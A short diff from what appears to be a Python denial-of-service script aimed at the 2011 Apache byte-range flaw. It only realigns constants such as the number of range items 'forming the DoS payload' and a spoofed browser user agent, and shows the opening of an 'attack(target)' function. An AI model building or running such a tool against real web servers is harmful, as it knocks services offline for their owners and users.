@@ -9,10 +9,10 @@ LICENSE     = "Public domain (FREE)"
 SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
 REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"
 
-SLEEP_TIME = 3          # time to wait for new thread slots (after max number reached)
-RECV_SIZE = 100         # receive buffer size in testing mode
-RANGE_NUMBER = 1024     # number of range subitems forming the DoS payload
-USER_AGENT = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
+SLEEP_TIME      = 3     # time to wait for new thread slots (after max number reached)
+RECV_SIZE       = 100   # receive buffer size in testing mode
+RANGE_NUMBER    = 1024  # number of range subitems forming the DoS payload
+USER_AGENT      = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
 
 def attack(target):
     port = 443 if 'https' in target else 80
